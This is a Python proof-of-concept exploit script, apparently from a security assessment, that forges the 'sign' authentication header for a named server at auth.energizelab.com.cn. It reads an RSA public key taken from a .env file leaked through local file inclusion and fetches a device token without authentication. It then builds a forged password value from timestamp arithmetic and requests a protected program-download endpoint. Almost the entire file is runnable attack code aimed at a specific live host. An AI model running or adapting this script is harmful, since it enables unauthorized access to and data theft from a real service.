#!/usr/bin/env python3
"""
EK-07: SignGuard forgery (the "hardware signature" = arithmetic + a public key).

Le header `sign` est du JSON {"time","number","psw","chipid","mode_number","token"}
encrypted in RSA-2048 OAEP-SHA256 chunks with DEVICE_RSA_PUBLIC_KEY (a public key,
exposed in the LFI-readable .env). The only content check:
  psw.slice(4, -4) == str(int(time) + int(number))[-4:]

Requires: pip3 install cryptography requests
Usage     : python3 poc_03_sign_forge.py --env-file .env.domestic.lfi [--sn <chipid>]
            (--env-file = LFI output, see poc_02; without a real chipid the server
             now answers "chipid is illegal": validation added 2026-09)
"""
import argparse, base64, json, re, sys, time
import requests
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

AUTH = "http://auth.energizelab.com.cn:9080"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--env-file", required=True)
    ap.add_argument("--chipid", default="deadbeefcafe0000")
    ap.add_argument("--sn-for-token", default="deadbeef0001")
    args = ap.parse_args()

    env = open(args.env_file).read()
    m = re.search(r'DEVICE_RSA_PUBLIC_KEY="?[\s]*-----BEGIN PUBLIC KEY-----\s*'
                  r'([A-Za-z0-9+/=\s]+?)-----END PUBLIC KEY-----', env)
    if not m:
        sys.exit("DEVICE_RSA_PUBLIC_KEY introuvable dans le fichier .env fourni")
    b64 = re.sub(r"\s", "", m.group(1))
    pub = serialization.load_pem_public_key(
        b"-----BEGIN PUBLIC KEY-----\n" + b64.encode() + b"\n-----END PUBLIC KEY-----")

    # JWT device zero-auth (EK-06)
    dt = requests.post(f"{AUTH}/api/auth/getDeviceToken",
                       json={"sn": args.sn_for_token}, timeout=15).json()["data"]["access_token"]

    ms = str(int(time.time() * 1000))
    payload = json.dumps({"time": ms, "number": "1",
                          "psw": "aaaa" + str(int(ms) + 1)[-4:] + "bbbb",
                          "chipid": args.chipid, "mode_number": "4101000", "token": dt})
    ct = b""
    for i in range(0, len(payload), 100):
        ct += pub.encrypt(payload[i:i + 100].encode(),
                          padding.OAEP(mgf=padding.MGF1(hashes.SHA256()),
                                       algorithm=hashes.SHA256(), label=None))
    sign = base64.b64encode(ct).decode()

    r = requests.get(f"{AUTH}/api/program/downloadProgramZip", params={"id": "999999"},
                     headers={"sign": sign, "token": dt}, timeout=20)
    print(f"HTTP {r.status_code} | {r.text[:150]}")
    if "chipid is illegal" in r.text:
        print("→ RSA sign decrypted successfully (no signature error); "
              "only the DB chipid validation now blocks fictional chipids")
    elif r.status_code == 200:
        print("→ forged sign accepted")


if __name__ == "__main__":
    main()
